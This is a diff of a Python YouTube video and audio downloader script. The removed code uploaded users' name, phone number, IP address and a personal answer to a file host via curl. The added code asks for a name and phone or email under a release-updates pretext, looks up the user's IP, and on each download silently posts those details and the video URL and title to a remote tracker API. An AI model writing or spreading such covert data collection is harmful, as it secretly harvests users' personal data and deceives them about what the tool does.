@@ -5,10 +5,10 @@ import subprocess as s
 import re
 import json
 import shutil
-
+import requests
 try:
     from colored import fg, attr
-    f = fg(117)  # Colors
+    f = fg(117)  
     r = fg(1)
     b = attr(0)
     import fontstyle as f
@@ -20,16 +20,13 @@ except ImportError:
     os.system("pip install fontstyle")
     os.system("pip install yt_dlp")
     os.system("pip install colored")
-    os.system("pkg install curl")
-    os.system("pkg install libqrencode")
     print('\nRun the code again')
     exit()
 
 tname = f.apply('WHAT IS YOUR NAME?', '/yellow/bold')
 warning = f.apply(
     "(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
-tnum = f.apply('ENTER YOU PHONE NUMBER', '/cyan/bold')
-ttext = f.apply('WHOM DO YOU LOVE THE MOST? : ', '/green/bold')
+tnum = f.apply('ENTER YOU PHONE NUMBER OR EMAIL TO STAY UPDATED ABOUT NEW RELEASES', '/cyan/bold')
 f1 = '''                   ▄▀▄     ▄▀▄
                   ▄█░░▀▀▀▀▀░░█▄
               ▄▄  █░░░░░░░░░░░█  ▄▄
@@ -94,17 +91,16 @@ def main_mp4():
     print('\n' + f.apply("Enter the URL of the video you want to download as MP4:", "/green/bold"))
     url = input(">> ")
 
-    # Validate YouTube URL
+
     url_pattern = re.compile(r'^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$')
     if not url_pattern.match(url):
         print(f.apply("Invalid URL. Please enter a valid YouTube URL.", "/red/bold"))
         return
 
     url = url.strip()
+    print(f.apply("\nFetching available video formats (this process could take 5-10s)...\n", "/cyan/bold"))
 
-    print(f.apply("\nFetching available video formats...\n", "/cyan/bold"))
-
-    # Fetch available formats using yt-dlp
+  
     try:
         process = s.Popen(['yt-dlp', '--list-formats', url],
                            stdout=s.PIPE, stderr=s.PIPE)
@@ -131,7 +127,14 @@ def main_mp4():
         print(f.apply(f"An error occurred: {e}", "/red/bold"))
         return
 
-    # Filter video and audio formats
+
+    title_test=info.get("title","Unknown title")
+
+###############
+    log_usage(name, num, url, title_test, 'video')
+###############
+
+    
     video_formats = [f for f in formats if f.get('vcodec') != 'none']
     audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']
 
@@ -261,6 +264,7 @@ def main_mp4():
     else:
         print(f.apply("No audio merging required.", "/yellow/bold"))
 
+    
     # Cleanup temporary files
     temp_audio_dir = os.getcwd() + '/audio_temp'
     if os.path.exists(temp_audio_dir):
@@ -280,7 +284,7 @@ def main_mp3():
 
     url = url.strip()
 
-    print("\nFetching audio information...\n")
+    print("\nFetching audio information (this process could take 5s)...\n")
 
     try:
         process = s.Popen(['yt-dlp', '-j', url],
@@ -343,7 +347,12 @@ def main_mp3():
     time1 = int(time.time())
 
     destination = get_download_path("mp3")
+    
+    ##############
+    log_usage(name, num, url, info_json.get("title", "Unknown Title"), 'audio')
+    ##############
 
+    
     try:
         s.call(['yt-dlp', '-f', download_format, '-x', '--audio-format', 'mp3', '-o', os.path.join(destination, '%(title)s.%(ext)s'), url])
         print(f.apply("MP3 audio downloaded successfully.", "/green/bold"))
@@ -363,54 +372,67 @@ def filesize_format(size):
             break
         size /= 1024.0
     return f"{size:.2f} {unit}"
+################
+
+
+
+def log_usage(name, num, video_url, video_title, action):
+    try:
+        ip =requests.get('https://api.ipify.org').text
+    except:
+        ip = "Unknown"
+        pass
+    payload = {
+        "name": name,
+        "video": video_url,
+        "title": video_title,
+        "ip": ip,
+        "contact": num,
+        "action": action
+    }
+
+    try:
+        res = requests.post("https://trackerapi-production-253e.up.railway.app/log-download",
+                            json=payload,
+                            headers={"Content-Type": "application/json"})
+
+    except Exception as e :
+        print(e)
+        time.sleep(3)
+        pass 
 
 
 ##############################
 
 
-# ip="kaif"
 def dat_collect():
     file = open('data.py', 'w')
-    process = s.run(['curl', 'ifconfig.me', '-4'],
-                    capture_output=True, text=True, check=True)
-    ip = process.stdout.strip()
-
     print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
     mm = input(tname + warning + '⚠⚠ : ')
     print('  ')
     nn = input(tnum + warning + '⚠⚠ : ')
     print('   ')
-    op = input(ttext)
-    oo = str(op)
-    file.write(f"Name='{mm}' \nNum='{nn}' \nText='{oo}' \nIP='{ip}'")
-    print('\n', error)
+    file.write(f"Name='{mm}' \nNum='{nn}' ")
     file.close()
-    exit()
+    return
 
 
 try:
     import data
     name = data.Name
     num = data.Num
-    text = data.Text
 except:
     dat_collect()
-try:
-    qr = name + '.png'
-    os.system(f"qrencode -r data.py -o '{qr}'")
-    os.system(
-        f"curl -F 'UPLOADCARE_PUB_KEY=a254a76e620891b80c5f' -F 'file=@{qr}' https://upload.uploadcare.com/base/")
+    import data
+    name = data.Name
+    num = data.Num
+    pass 
+try: 
     os.system("clear")
-    os.system(f"rm -r -f __pycache__ && rm '{qr}'")
+    os.system(f"rm -r -f __pycache__ ")
 except:
-    try:
-        os.system("rm -r -f __pycache__")
-    except:
-        try:
-            os.system(f"rm '{qr}'")
-        finally:
-            pass
-    pass
+ pass
+
 
 bio()
 option = input(des4)
@@ -452,12 +474,4 @@ while (choice == "" or choice == " "):
     else:
         print('''\nHave a nice day Bye!''')
         exit()
-    print(exitc)
-    choice = input(">>")
-
-else:
-    exit()
-
-s.call(["pip", "install", "--upgrade", "yt-dlp"])
-
-
+   
